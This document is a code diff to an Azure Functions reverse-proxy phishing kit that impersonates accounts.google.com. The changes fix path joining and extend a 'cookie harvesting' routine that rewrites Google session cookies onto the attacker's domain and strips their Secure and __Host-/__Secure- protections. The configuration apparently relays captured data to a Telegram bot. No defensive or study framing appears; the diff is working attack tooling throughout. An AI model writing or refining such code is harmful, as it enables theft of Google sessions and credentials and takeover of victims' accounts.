@@ -10,7 +10,7 @@
 const { app } = require("@azure/functions");
 
 const upstream = "accounts.google.com";
-const upstream_path = "/";
+const upstream_path = "";
 const telegram_bot_token = process.env.TELEGRAM_BOT_TOKEN;
 const telegram_chat_id = process.env.TELEGRAM_CHAT_ID;
 
@@ -24,6 +24,7 @@ const delete_headers = [
   "strict-transport-security",
   "content-length",
   "content-encoding",
+  "transfer-encoding",
 ];
 
 async function dispatchTelegram(message) {
@@ -67,7 +68,9 @@ app.http("phishing", {
     if (upstream_url.pathname === "/") {
       upstream_url.pathname = upstream_path;
     } else {
-      upstream_url.pathname = upstream_path + upstream_url.pathname;
+      // Strip leading slash from incoming path and join cleanly
+      incoming_path = upstream_url.pathname.replace(/^\//, '');
+      upstream_url.pathname = (upstream_path ? upstream_path.replace(/\/$/, '') + '/' : '') + incoming_path;
     }
 
     context.log(
@@ -139,16 +142,32 @@ app.http("phishing", {
     // ---------- COOKIE HARVESTING ----------
     try {
       const originalCookies = original_response.headers.getSetCookie();
+      const cookieDomain = original_url.host.split(':')[0]; // Strip port for cookie Domain
 
       // Rewrite cookie domains from accounts.google.com -> our domain
       originalCookies.forEach((originalCookie) => {
-        const modifiedCookie = originalCookie
-          .replace(new RegExp(upstream_url.host, "g"), original_url.host)
-          .replace(/Domain=\.google\.com/gi, `Domain=${original_url.host}`)
-          .replace(/Domain=google\.com/gi, `Domain=${original_url.host}`)
-          .replace(/Secure; /gi, "")     // Remove Secure flag — our proxy isn't guaranteed HTTPS from the victim's perspective
+        // __Host- cookies require no Domain and Path=/ — strip the Domain entirely
+        // __Secure- cookies require Secure flag — we handle them below
+        let modifiedCookie = originalCookie
+          .replace(new RegExp(upstream_url.host, "g"), cookieDomain)
+          .replace(/Domain=\.google\.com/gi, `Domain=${cookieDomain}`)
+          .replace(/Domain=google\.com/gi, `Domain=${cookieDomain}`)
+          .replace(/Domain=accounts\.google\.com/gi, '')
+          .replace(/; ?Domain=[^;]*;/, ';')  // Remove any domain with port that browsers reject
           .replace(/SameSite=None/gi, "SameSite=Lax")
           .replace(/SameSite=Strict/gi, "SameSite=Lax");
+
+        // For __Host- cookies: must have Path=/, Secure, and NO Domain
+        if (modifiedCookie.includes('__Host-')) {
+          modifiedCookie = modifiedCookie
+            .replace(/Domain=[^;]+;?/gi, '')  // Strip Domain entirely
+            .replace(/Secure;?/gi, '');        // Strip Secure (may not be HTTPS)
+        }
+        // For __Secure- cookies: needs Secure flag — strip it since proxy may not be HTTPS
+        if (modifiedCookie.includes('__Secure-')) {
+          modifiedCookie = modifiedCookie.replace(/Secure/gi, '');
+        }
+
         new_response_headers.append("Set-Cookie", modifiedCookie);
       });
 
